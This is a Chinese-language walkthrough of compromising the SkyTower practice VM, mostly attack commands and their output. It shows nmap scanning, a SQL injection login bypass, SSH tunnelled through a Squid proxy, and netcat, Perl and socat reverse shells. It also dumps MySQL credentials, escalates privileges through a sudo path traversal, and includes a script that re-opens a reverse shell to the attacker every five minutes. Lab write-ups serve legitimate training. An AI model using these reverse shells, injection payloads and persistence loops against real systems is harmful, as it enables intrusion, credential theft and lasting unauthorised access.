1、nmap 10.211.55.0/24 -sP
Nmap scan report for localhost (10.211.55.38)

2、全端口扫描nmap
nmap -sS -sV -A -T5 10.211.55.38

22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
3128/tcp open     http-proxy Squid http proxy 3.1.20

开启了三个端口！squid-http


3、页面枚举sql注入

访问：http://10.211.55.38/

利用burpsuite抓包拦截发送到->intruder进行sql注入爆破，为了确保选择email和password字段，攻击类型设置：pitchfork

利用源码：
https://github.com/melbinkm/SQL-Injection-Payloads/blob/master/sqli_auth.list

payloads1和2选择同样的文本，并单击Start Attack！
当攻击继续进行时，可以注意到一些请求的响应长度是231一些是1838，1838是想要的结果，因为是登录成功！

可看到有八条1838的内容都是成功回显，将数据包放Repeater发送！

Username: john
Password: hereisjohn
获得账号密码！

分析：sqlmap
使用自动化sql注入测试工具无法跑进去寻找出数据，因为对sql语句已经完成过滤！

mysql数据库信息通常用：
| 是或(or)运算符号，相同位只要一个为1即为1。如00111 | 11100=11111

'||1

常见的sql注入：
' and '1'='1 OR and '1'='2
and 1=1 OR and 1=2
and sleep(5)
' –-

SQL Server、Oracle注释可以用-- 
Mysql注入可以用#、-- /**/ 、;%00 、/*letmetest*/

所以这里手工注入用'||1#即可绕过！


4、代理转发SSH

Username: john
Password: hereisjohn
ssh john@10.211.55.38   ---发现是无法登录的，因为22端口过滤了

3128端口开启了squid-http
Squid cache（简称为Squid）是流行最广的，使用最普遍的开源缓存代理服务器：
https://blog.csdn.net/qq_21419995/article/details/80888680

--------------------
1）方法1：proxychains代理
ProxyChains是Linux和其他Unix下的代理工具。 它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、 SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。 ProxyChains通过一个用户定义的代理列表强制连接指定的应用程序， 直接断开接收方和发送方的连接。

ProxyChains 是一个强制应用的 TCP 连接通过代理的工具，支持 Tor、HTTP、与 Socks 代理。与 sshuttle 不同的是，ProxyChains 只会将当前应用的 TCP 连接转发至代理，而非全局代理。
https://zhuanlan.zhihu.com/p/166375631


使用proxychains进行代理登录ssh：
vi /etc/proxychains4.conf
添加：http 10.211.55.38 3128
proxychains ssh  john@10.211.55.38  ---自动断开了，发现只可读不可写

proxychains ssh -t john@10.211.55.38 cat .bashrc   ----成功执行命令

2）方法2：proxytunnel隧道代理
proxytunnel是一款利用http connection封装技术建立隧道的工具
使用条件：防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景
-a 指定本地侦听端口
-p 使用代理
-r 使用第二个代理
-d 指定访问的目标和端口

proxytunnel -p 10.211.55.38:3128 -d 127.0.0.1:22 -a 1234  kali本地1234端口
将kali与项目的3128端口建立隧道，隧道建立的端口转发到项目本地的22端口，然后在映射到kali本地1234端口。

ssh john@127.0.0.1 -p 1234    ---成功登录
hereisjohn
--------------------
绕过ssh
不允许用户生成 TTY shell，使用 SSH 绕过此类限制
nc -vlp 5566
ssh john@127.0.0.1 -p 1234 nc 10.211.55.19 5566 -e /bin/bash
hereisjohn

ssh john@127.0.0.1 -p 1234 mv .bashrc .bashrc.bak   ---或者rm删除
ssh john@127.0.0.1 -p 1234
hereisjohn


前面报错的时候提示了：Funds have been withdrawn
grep -rn "Funds have been withdrawn"
.bashrc:113:echo  "Funds have been withdrawn"
----------
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

i选项是关闭的
这里面的命令导致结束shell！
---------

.bashrc详解：
https://linux.cn/article-9298-1.html
http://c.biancheng.net/view/2767.html


该环境下没有安装python，那么安装perl在反弹下：
perl -e 'use Socket;$i="10.211.55.19";$p=6677;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python -c 'import pty; pty.spawn("/bin/bash")'


5、mysql信息枚举
-----------------------
sudo -l

Sorry, user john may not run sudo on SkyTower.
直接sudo提权…提示不能提权，就知道没这么简单…
-----------------------
查看底层文件login.php
$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
这是sql语句的限制！

发现mysql用户密码：root/root


mysql -uroot -proot
show databases;
use SkyTech
show tables;
select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
存在三个账号密码信息！

ssh sara@127.0.0.1 -p 1234 mv .bashrc .bashrc.bak    ---成功登录
ssh sara@127.0.0.1 -p 1234
ihatethisjob

ssh william@127.0.0.1 -p 1234 mv .bashrc .bashrc.bak   ---登录失败
ssh william@127.0.0.1 -p 1234
senseable

6、提权

1）sara
sudo -l

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*

可看到具有root cat可读权限！
sudo ls /accounts/../root
sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower

说root的密码是：theskytower

ssh root@127.0.0.1 -p 1234
theskytower

成功登录！


------------
拓展知识：不需要mysql知道信息枚举
1）枚举信息+sql注入拿ssh多个账户权限
cat /etc/passwd

username: sara@skytech.com
password: '-'

username: william@skytech.com
password: '-'

2）pty方法
wget --no-check-certificate https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-x86_64 -O socat

wget http://10.211.55.19:8081/socat
chmod +x socat

nc -vlp 9999
HOME=/dev/shm ./socat tcp:10.211.55.19:9998 exec:'/bin/bash -li',pty,stderr,sigint,sighup,sigquit,sane
回显：
john@SkyTower:/home/john$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified
john@SkyTower:/home/john$ 
还是没补齐命令，使用script：
script -qc bash /dev/null
这时候就可以：sudo -l
hereisjohn
成功交互tty！

3）小技巧替换bashrc
sed -i 's/exit/echo/g' .bashrc

ssh john@127.0.0.1 -p 1234 -t "sed -i 's/exit/echo/g' .bashrc"
hereisjohn

-i  直接修改文件

用sed将bashrc文件中的exit全部替换为echo！

或者：
ssh john@127.0.0.1 -p 1234 -t "head -n -3 .bashrc > .bashrc"
hereisjohn

head删除最后三行信息！

4）小技巧：每五分钟回弹一个shell
----------------------------
#!/bin/sh
while true; do
    perl -e 'use Socket;$i="10.211.55.19";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
    # sleep for 300 seconds (5 mins)
    sleep 300
done
----------------------------
因为shell是通过22端口代理进去的实战中防止万一情况发生，由于对方安装了perl，所以用该进行反弹！每五分钟会回弹一次！

wget http://10.211.55.19:8081/dayu-shell.sh
chmod +x dayu-shell.sh
./dayu-shell.sh












